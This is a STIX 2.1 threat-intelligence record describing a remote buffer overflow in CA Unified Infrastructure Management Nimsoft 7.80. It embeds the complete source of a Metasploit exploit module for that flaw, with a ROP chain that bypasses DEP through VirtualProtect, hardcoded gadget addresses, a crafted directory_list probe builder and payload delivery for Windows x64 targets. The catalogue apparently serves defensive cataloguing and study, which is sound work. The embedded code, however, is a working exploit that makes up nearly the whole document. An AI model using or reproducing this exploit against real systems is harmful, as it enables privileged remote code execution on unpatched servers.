{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b677564-a7a5-42f8-840e-001943890c5e",
    "created": "2024-08-14T16:35:24.164918Z",
    "modified": "2024-08-14T16:35:24.164922Z",
    "name": "CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow within the CA Unified Infrastructure Management nimcontroller. The vulnerability occurs in the robot (controller) component when sending a specially crafted directory_list probe. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/nimsoft/nimcontroller_bof.rb",
            "external_id": "nimcontroller_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.broadcom.com/external/content/release-announcements/CA20200205-01-Security-Notice-for-CA-Unified-Infrastructure-Management/7832"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow',\n        'Description' => %q{\n          This module exploits a buffer overflow within the CA Unified Infrastructure Management nimcontroller.\n          The vulnerability occurs in the robot (controller) component when sending a specially crafted directory_list\n          probe.\n\n          Technically speaking the target host must also be vulnerable to CVE-2020-8010 in order to reach the\n          directory_list probe.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'wetw0rk' # Vulnerability Discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2020-8010' ], # CA UIM Probe Improper ACL Handling RCE (Multiple Attack Vectors)\n          [ 'CVE', '2020-8012' ], # CA UIM nimbuscontroller Buffer Overflow RCE\n          [ 'URL', 'https://support.broadcom.com/external/content/release-announcements/CA20200205-01-Security-Notice-for-CA-Unified-Infrastructure-Management/7832' ],\n          [ 'PACKETSTORM', '156577' ]\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process',\n          'AUTORUNSCRIPT' => 'post/windows/manage/migrate'\n        },\n        'Payload' => {\n          'Space' => 2000,\n          'DisableNops' => true\n        },\n        'Platform' => 'win',\n        'Arch' => ARCH_X64,\n        'Targets' => [\n          [\n            'Windows Universal (x64) - v7.80.3132',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'Version' => '7.80 [Build 7.80.3132, Jun  1 2015]',\n              'Ret' => 0x000000014006fd3d # pop rsp; or al, 0x00; add rsp, 0x0000000000000448 ; ret [controller.exe]\n            }\n          ],\n        ],\n        'Privileged' => true,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ]\n        },\n        'DisclosureDate' => '2020-02-05',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DIRECTORY', [false, 'Directory path to obtain a listing', 'C:\\\\']),\n        Opt::RPORT(48000),\n      ]\n    )\n  end\n\n  # check: there are only two prerequisites to getting code execution. The version number\n  # and access to the directory_list probe. The easiest way to get this information is to\n  # ask nicely ;)\n  def check\n    connect\n\n    sock.put(generate_probe('get_info', ['interfaces=0']))\n    response = sock.get_once(4096)\n\n    unless response\n      return CheckCode::Unknown('No response was returned from the target.')\n    end\n\n    list_check = -1\n\n    begin\n      if target['Version'].in? response\n        print_status(\"Version #{target['Version']} detected, sending directory_list probe\")\n        sock.put(generate_probe('directory_list', [\"directory=#{datastore['DIRECTORY']}\", 'detail=1']))\n        list_check = parse_listing(sock.get_once(4096), datastore['DIRECTORY'])\n      end\n    ensure\n      disconnect\n    end\n\n    if list_check == 0\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    connect\n\n    shellcode = make_nops(500)\n    shellcode << payload.encoded\n\n    offset = rand_text_alphanumeric(1000)\n    offset += \"\\x0f\" * 33\n\n    heap_flip = [target.ret].pack('Q<*')\n\n    alignment = rand_text_alphanumeric(7) # Adjustment for the initial chain\n    rop_chain = generate_rsp_chain # Stage1: Stack alignment\n    rop_chain += rand_text_alphanumeric(631) # Adjust for second stage\n    rop_chain += generate_rop_chain # Stage2: GetModuleHandleA, GetProcAddressStub, VirtualProtectStub\n    rop_chain += rand_text_alphanumeric((3500 - # ROP chain MUST be 3500 bytes, or exploitation WILL fail\n      rop_chain.length\n\n                                        ))\n    rop_chain += \"kernel32.dll\\x00\"\n    rop_chain += \"VirtualProtect\\x00\"\n\n    trigger = \"\\x10\" * (8000 - (\n      offset.length +\n      heap_flip.length +\n      alignment.length +\n      rop_chain.length +\n      shellcode.length\n    )\n                       )\n\n    buffer = offset + heap_flip + alignment + rop_chain + shellcode + trigger\n    exploit_packet = generate_probe(\n      'directory_list',\n      [\"directory=#{buffer}\"]\n    )\n\n    sock.put(exploit_packet)\n\n    disconnect\n  end\n\n  # generate_rsp_chain: This chain will re-align RSP / Stack, it MUST be a multiple of 16 bytes\n  # otherwise our call will fail. I had VP work 50% of the time when the stack was unaligned.\n  def generate_rsp_chain\n    rop_gadgets = [0x0000000140018c42] * 20 # ret\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret\n      0x00000001401a3000, # *ptr to handle reference ( MEM_COMMIT | PAGE_READWRITE | MEM_IMAGE )\n      0x00000001400af237, # pop rdi ; ret\n      0x0000000000000007, # alignment for rsp\n      0x0000000140025dab\n    ] # add esp, edi ; adc byte [rax], al ; add rsp, 0x0000000000000278 ; ret\n\n    return rop_gadgets.pack('Q<*')\n  end\n\n  # generate_rop_chain: This chain will craft function calls to GetModuleHandleA, GetProcAddressStub,\n  # and finally VirtualProtectStub. Once completed, we have bypassed DEP and can get code execution.\n  # Since we dynamically generate VirtualProtectStub, we needn't worry about other OS's.\n  def generate_rop_chain\n    # RAX -> HMODULE GetModuleHandleA(\n    #   ( RCX == *module ) LPCSTR lpModuleName,\n    # );\n    rop_gadgets = [0x0000000140018c42] * 15 # ret\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret\n      0x0000000000000000, # (zero out rax)\n      0x00000001400eade1, # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000\n    ] #\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [\n      0x0000000140131643, # pop rcx ; ret\n      0x00000000000009dd, # offset to \"kernel32.dll\"\n      0x000000014006d8d8\n    ] # add rax, rcx ; add rsp, 0x38 ; ret\n\n    rop_gadgets += [0x0000000140018c42] * 15 # ret\n\n    rop_gadgets += [0x00000001400b741b] # xchg eax, ecx ; ret\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret\n      0x000000014015e310, # GetModuleHandleA (0x00000000014015E330-20)\n      0x00000001400d1161\n    ] # call qword ptr [rax+20] ; add rsp, 0x40 ; pop rbx ; ret\n    rop_gadgets += [0x0000000140018c42] * 17 # ret\n\n    # RAX -> FARPROC GetProcAddressStub(\n    #   ( RCX == &addr    ) HMODULE hModule,\n    #   ( RDX == *module  ) lpProcName\n    # );\n    rop_gadgets += [\n      0x0000000140111c09, # xchg rax, r11 ; or al, 0x00 ; ret (backup &hModule)\n      0x0000000140002ef6, # pop rax ; ret\n      0x0000000000000000, # (zero out rax)\n      0x00000001400eade1, # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000\n    ] #\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [\n      0x0000000140131643, # pop rcx ; ret\n      0x0000000000000812, # offset to \"virtualprotectstub\"\n      0x000000014006d8d8\n    ] # add rax, rcx ; add rsp, 0x38 ; ret\n    rop_gadgets += [0x0000000140018c42] * 15 # ret\n    rop_gadgets += [0x0000000140135e39] # mov edx, eax ; mov rbx, qword [rsp+0x30] ; mov rbp, qword [rsp+0x38] ; mov rsi, qword [rsp+0x40]\n    # mov rdi, qword [rsp+0x48] ; mov eax, edx ; add rsp, 0x20 ; pop r12 ; ret\n\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [0x00000001400d1ab8] # mov rax, r11 ; add rsp, 0x30 ; pop rdi ; ret\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [0x0000000140111ca1] # xchg rax, r13 ; or al, 0x00 ; ret\n    rop_gadgets += [\n      0x00000001400cf3d5, # mov rcx, r13 ; mov r13, qword [rsp+0x50] ; shr rsi, cl ; mov rax, rsi ; add rsp, 0x20 ; pop rdi ; pop rsi ; pop rbp ; ret\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000\n    ] #\n    rop_gadgets += [0x0000000140018c42] * 6 # ret\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret\n      0x000000014015e318\n    ] # GetProcAddressStub (0x00000000014015e338-20)\n    rop_gadgets += [0x00000001400d1161] # call qword ptr [rax+20] ; add rsp, 0x40 ; pop rbx ; ret\n    rop_gadgets += [0x0000000140018c42] * 17 # ret\n\n    # RAX -> BOOL VirtualProtectStub(\n    #   ( RCX == *shellcode          ) LPVOID  lpAddress,\n    #   ( RDX == len(shellcode)      ) SIZE_T  dwSize,\n    #   ( R8  == 0x0000000000000040  ) DWORD   flNewProtect,\n    #   ( R9  == *writeable location ) PDWORD  lpflOldProtect,\n    # );\n    rop_gadgets += [\n      0x0000000140111c09, # xchg rax, r11 ; or al, 0x00 ; ret (backup *VirtualProtectStub)\n      0x000000014013d651, # pop r12 ; ret\n      0x00000001401fb000, # *writeable location ( MEM_COMMIT | PAGE_READWRITE | MEM_IMAGE )\n      0x00000001400eba74\n    ] # or r9, r12 ; mov rax, r9 ; mov rbx, qword [rsp+0x50] ; mov rbp, qword [rsp+0x58] ; add rsp, 0x20 ; pop r12 ; pop rdi ; pop rsi ; ret\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret\n      0x0000000000000000\n    ]\n    rop_gadgets += [\n      0x00000001400eade1, # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000\n    ] #\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [\n      0x0000000140131643, # pop rcx ; ret\n      0x000000000000059f, # (offset to *shellcode)\n      0x000000014006d8d8\n    ] # add rax, rcx ; add rsp, 0x38 ; ret\n    rop_gadgets += [0x0000000140018c42] * 15 # ret\n    rop_gadgets += [0x00000001400b741b] # xchg eax, ecx ; ret\n    rop_gadgets += [\n      0x00000001400496a2, # pop rdx ; ret\n      0x00000000000005dc\n    ] # dwSize\n    rop_gadgets += [\n      0x00000001400bc39c, # pop r8 ; ret\n      0x0000000000000040\n    ] # flNewProtect\n    rop_gadgets += [0x00000001400c5f8a] # mov rax, r11 ; add rsp, 0x38 ; ret (RESTORE VirtualProtectStub)\n    rop_gadgets += [0x0000000140018c42] * 17 # ret\n    rop_gadgets += [0x00000001400a0b55] # call rax ; mov rdp qword ptr [rsp+48h] ; mov rsi, qword ptr [rsp+50h]\n    # mov rax, rbx ; mov rbx, qword ptr [rsp + 40h] ; add rsp,30h ; pop rdi ; ret\n\n    rop_gadgets += [0x0000000140018c42] * 20 # ret\n\n    rop_gadgets += [\n      0x0000000140002ef6, # pop rax ; ret (CALL COMPLETE, \"JUMP\" INTO OUR SHELLCODE)\n      0x0000000000000000, # (zero out rax)\n      0x00000001400eade1, # mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000, #\n      0x0000000000000000\n    ] #\n    rop_gadgets += [0x0000000140018c42] * 10 # ret\n    rop_gadgets += [\n      0x0000000140131643, # pop rcx ; ret\n      0x0000000000000317, # (offset to our shellcode)\n      0x000000014006d8d8\n    ] # add rax, rcx ; add rsp, 0x38 ; ret\n    rop_gadgets += [0x0000000140018c42] * 15 # ret\n    rop_gadgets += [0x00000001400a9747] # jmp rax\n    rop_gadgets += [0x0000000140018c42] * 20 # ret (do not remove)\n\n    return rop_gadgets.pack('Q<*')\n  end\n\n  # parse_listing: once the directory_list probe is sent we're returned a directory listing\n  # unfortunately it's hard to read this simply \"decodes\" it\n  def parse_listing(response, directory)\n    result = { 'name' => '', 'date' => '', 'size' => '', 'type' => '' }\n    i = 0\n\n    begin\n      dirlist = response.split('\\x00')[0].split(\"\\x00\")\n      index = dirlist.index('entry') + 3\n      final = dirlist[index..]\n    rescue StandardError\n      print_error('Failed to gather directory listing')\n      return -1\n    end\n\n    print_line(\"\\n Directory of #{directory}\\n\")\n\n    check = 0\n    name = 0\n    ftime = 0\n    size = 0\n    ftype = 0\n\n    while i < final.length\n\n      if name == 1 && final[i].to_i <= 0\n        result['name'] = final[i]\n        name = 0\n        check += 1\n      end\n      if size >= 1\n        if size == 3\n          result['size'] = final[i]\n          size = 0\n          check += 1\n        else\n          size += 1\n        end\n      end\n      if ftype >= 1\n        if ftype == 3\n          result['type'] = final[i]\n          ftype = 0\n          check += 1\n        else\n          ftype += 1\n        end\n      end\n      if ftime >= 1\n        if ftime == 3\n          result['date'] = final[i]\n          ftime = 0\n          check += 1\n        else\n          ftime += 1\n        end\n      end\n\n      if final[i].include? 'name'\n        name = 1\n      end\n      if final[i].include? 'size'\n        size = 1\n      end\n      if final[i].include? 'size'\n        ftype = 1\n      end\n      if final[i].include? 'last_modified'\n        ftime = 1\n      end\n\n      i += 1\n\n      next unless check == 4\n\n      if result['type'] == '2'\n        result['type'] = ''\n      else\n        result['type'] = '<DIR>'\n        result['size'] = ''\n      end\n\n      begin\n        time = Time.at(result['date'].to_i)\n        timestamp = time.strftime('%m/%d/%Y %I:%M %p')\n      rescue StandardError\n        timestamp = '??/??/???? ??:?? ??'\n      end\n\n      print_line(format('%20<timestamp>s %6<type>s %<name>s', timestamp: timestamp, type: result['type'], name: result['name']))\n\n      check = 0\n    end\n    print_line('')\n    return 0\n  end\n\n  # generate_probe: The nimcontroller utilizes the closed source protocol nimsoft so we need to specially\n  # craft probes in order for the controller to accept any input.\n  def generate_probe(probe, args)\n    client = \"#{rand_text_alphanumeric(14)}\\x00\"\n    packet_args = ''\n    probe += \"\\x00\"\n\n    for arg in args\n\n      c = ''\n      i = 0\n\n      while c != '='\n\n        c = arg[i]\n        i += 1\n\n      end\n\n      packet_args << \"#{arg[0, (i - 1)]}\\x00\"\n      packet_args << \"1\\x00#{arg[i..].length + 1}\\x00\"\n      packet_args << \"#{arg[i..]}\\x00\"\n\n    end\n\n    packet_header = 'nimbus/1.0 ' # nimbus header (length of body) (length of args)\n    packet_body = \"mtype\\x00\" # mtype\n    packet_body << \"7\\x004\\x00100\\x00\" # 7.4.100\n    packet_body << \"cmd\\x00\" # cmd\n    packet_body << \"7\\x00#{probe.length}\\x00\" # 7.(length of probe)\n    packet_body << probe # probe\n    packet_body << \"seq\\x00\" # seq\n    packet_body << \"1\\x002\\x000\\x00\" # 1.2.0\n    packet_body << \"ts\\x00\" # ts\n    packet_body << \"1\\x0011\\x00#{rand_text_alphanumeric(10)}\\x00\" # 1.11.(UNIX EPOCH TIME)\n    packet_body << \"frm\\x00\" # frm\n    packet_body << \"7\\x00#{client.length}\\x00\" # 7.(length of client)\n    packet_body << client # client address\n    packet_body << \"tout\\x00\" # tout\n    packet_body << \"1\\x004\\x00180\\x00\" # 1.4.180\n    packet_body << \"addr\\x00\" # addr\n    packet_body << \"7\\x000\\x00\" # 7.0\n    #\n    # probe packet arguments (dynamic)\n    # argument\n    # length of arg value\n    # argument value\n\n    packet_header << \"#{packet_body.length} #{packet_args.length}\\r\\n\"\n    probe = packet_header + packet_body + packet_args\n\n    return probe\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}